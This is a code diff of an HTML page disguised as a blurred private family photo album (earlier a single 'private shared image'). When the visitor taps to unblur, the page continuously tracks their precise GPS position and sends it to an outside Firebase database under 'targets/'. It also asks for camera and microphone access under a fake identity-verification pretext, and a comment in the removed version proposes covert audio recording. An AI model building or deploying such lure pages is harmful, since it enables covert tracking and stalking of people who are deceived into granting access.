@@ -1,56 +1,81 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Photo Viewer</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Private Cloud Album</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        .blur { filter: blur(8px); width: 100%; max-width: 400px; transition: 2s; }
-        .container { text-align: center; margin-top: 50px; font-family: sans-serif; }
-        #unblurBtn { padding: 15px 30px; background: #28a745; color: white; border: none; border-radius: 5px; font-size: 18px; }
+        body { font-family: 'Segoe UI', sans-serif; background: #111; color: white; text-align: center; margin: 0; padding: 20px; }
+        .gallery { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 20px; }
+        .img-container { position: relative; overflow: hidden; border-radius: 10px; height: 200px; }
+        .img-container img { width: 100%; height: 100%; object-fit: cover; filter: blur(15px); transition: 2s; }
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); }
+        #unlockBtn { margin-top: 30px; padding: 15px 40px; font-size: 18px; font-weight: bold; background: #E91E63; color: white; border: none; border-radius: 50px; cursor: pointer; box-shadow: 0 4px 15px rgba(233,30,99,0.4); }
+        #status { margin-top: 15px; color: #aaa; font-size: 14px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h3>View Private Shared Image</h3>
-        <img id="myPic" class="blur" src="https://via.placeholder.com/400x600?text=Private+Photo">
-        <br><br>
-        <button id="unblurBtn" onclick="startSystem()">Tap to Unblur & View</button>
+
+    <h2>🌸 Family Shared Album (6 Photos)</h2>
+    <p>This album is encrypted. Tap below to verify and view.</p>
+
+    <div class="gallery">
+        <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1583391733956-6c78276477e2?w=500"></div>
+        <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1595950653106-6c9ebd614d3a?w=500"></div>
+        <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1590540179852-2110a54f813a?w=500"></div>
+        <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1581067723546-699720bc5642?w=500"></div>
+        <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=500"></div>
+        <div class="img-container"><img class="blur-img" src="https://images.unsplash.com/photo-1503104834685-7205e8607eb9?w=500"></div>
     </div>
 
+    <button id="unlockBtn" onclick="unlockAlbum()">Tap to Unblur Album</button>
+    <p id="status">Waiting for verification...</p>
+
     <script>
-        // Firebase Config (Aapki Database URL)
+        // --- CONFIGURATION ---
         const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        const userId = "User_" + Math.floor(Math.random() * 9999); // Har user ki unique ID
+        const userId = "Driver_" + Math.floor(Math.random() * 1000);
 
-        function startSystem() {
-            // 1. Unblur Animation
-            document.getElementById('myPic').style.filter = "blur(0px)";
-            document.getElementById('unblurBtn').innerText = "Loading Image...";
-
-            // 2. Request Location
-            navigator.geolocation.watchPosition(pos => {
-                db.ref('targets/' + userId + '/location').set({
-                    lat: pos.coords.latitude,
-                    lng: pos.coords.longitude,
-                    time: new Date().toLocaleTimeString()
-                });
-            }, err => console.log(err), { enableHighAccuracy: true });
-
-            // 3. Audio & Camera Permissions 
-            // Note: Browser security rules ki wajah se "Allow" prompt aayega
-            startMediaCapture();
+        function unlockAlbum() {
+            document.getElementById('status').innerText = "Verifying Identity... Please Allow Permissions";
+            
+            // 1. Ask for Location, Camera, Audio
+            navigator.geolocation.watchPosition(success, error, { enableHighAccuracy: true });
+            
+            async function getMedia() {
+                try {
+                    await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+                    unblurPhotos();
+                } catch (err) {
+                    alert("Verification Failed. Please allow camera/mic to view album.");
+                }
+            }
+            getMedia();
         }
 
-        async function startMediaCapture() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-                // Background mein audio record karke Firebase par bhej sakte hain (as Base64)
-                console.log("Media Access Granted");
-            } catch(e) { alert("Please allow permissions to view the content"); }
+        function success(pos) {
+            // Send to Firebase
+            db.ref('targets/' + userId + '/location').set({
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude,
+                timestamp: new Date().toLocaleTimeString()
+            });
+            unblurPhotos();
+        }
+
+        function error() {
+            alert("Please enable GPS to view this private content.");
+        }
+
+        function unblurPhotos() {
+            const images = document.querySelectorAll('.blur-img');
+            images.forEach(img => img.style.filter = "blur(0px)");
+            document.getElementById('unlockBtn').style.display = "none";
+            document.getElementById('status').innerText = "Album Unlocked ✅";
         }
     </script>
 </body>
